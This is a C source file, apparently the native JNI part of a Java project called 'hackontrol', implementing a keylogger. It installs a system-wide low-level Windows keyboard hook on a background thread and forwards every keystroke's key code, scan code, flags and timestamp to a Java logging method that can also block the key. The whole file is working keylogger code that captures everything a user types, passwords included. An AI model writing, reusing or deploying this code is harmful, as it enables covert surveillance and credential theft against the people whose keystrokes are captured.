#include <khopanjni.h>
#include <khopanerror.h>
#include "keylogger.h"

static JavaVM* globalVirtualMachine;
static JNIEnv* globalEnvironment;
static jclass globalNativeLibraryClass;
static jmethodID globalLogMethod;

static DWORD WINAPI KeyLoggerThread(_In_ LPVOID parameter);
static LRESULT CALLBACK KeyLoggerProcedure(_In_ int, _In_ WPARAM wparam, _In_ LPARAM lparam);

void KeyLoggerInitialize(JNIEnv* environment, JavaVM* virtualMachine) {
	globalVirtualMachine = virtualMachine;

	if(!CreateThread(NULL, 0, KeyLoggerThread, NULL, 0, NULL)) {
		KHWin32ErrorW(environment, GetLastError(), L"CreateThread");
	}
}

static DWORD WINAPI KeyLoggerThread(_In_ LPVOID parameter) {
	JavaVMAttachArgs arguments = {0};
	arguments.version = JNI_VERSION_21;
	arguments.name = NULL;
	arguments.group = NULL;
	JNIEnv* environment = NULL;
	
	if((*globalVirtualMachine)->AttachCurrentThread(globalVirtualMachine, (void**) &environment, &arguments)) {
		return 1;
	}

	globalEnvironment = environment;
	jclass nativeLibraryClass = (*environment)->FindClass(environment, "com/khopan/hackontrol/NativeLibrary");

	if(!nativeLibraryClass) {
		KHStandardErrorW(environment, L"Class 'com.khopan.hackontrol.NativeLibrary' not found");
		return 1;
	}

	globalNativeLibraryClass = nativeLibraryClass;
	jmethodID logMethod = (*environment)->GetStaticMethodID(environment, nativeLibraryClass, "log", "(IIIII)Z");
	
	if(!logMethod) {
		KHStandardErrorW(environment, L"Method 'log(IIIII)Z' not found in class 'com.khopan.hackontrol.NativeLibrary'");
		return 1;
	}

	globalLogMethod = logMethod;
	
	if(!SetWindowsHookExW(WH_KEYBOARD_LL, KeyLoggerProcedure, NULL, 0)) {
		KHWin32ErrorW(environment, GetLastError(), L"SetWindowsHookExW");
		return 1;
	}
	
	MSG message = {0};

	while(GetMessageW(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessageW(&message);
	}

	return 0;
}

static LRESULT CALLBACK KeyLoggerProcedure(_In_ int code, _In_ WPARAM wparam, _In_ LPARAM lparam) {
	if(code != HC_ACTION) {
		return CallNextHookEx(NULL, code, wparam, lparam);
	}

	PKBDLLHOOKSTRUCT keyboard = (PKBDLLHOOKSTRUCT) lparam;
	return (*globalEnvironment)->CallStaticBooleanMethod(globalEnvironment, globalNativeLibraryClass, globalLogMethod, (jint) wparam, (jint) keyboard->vkCode, (jint) keyboard->scanCode, (jint) keyboard->flags, (jint) keyboard->time) ? 1 : CallNextHookEx(NULL, code, wparam, lparam);
}
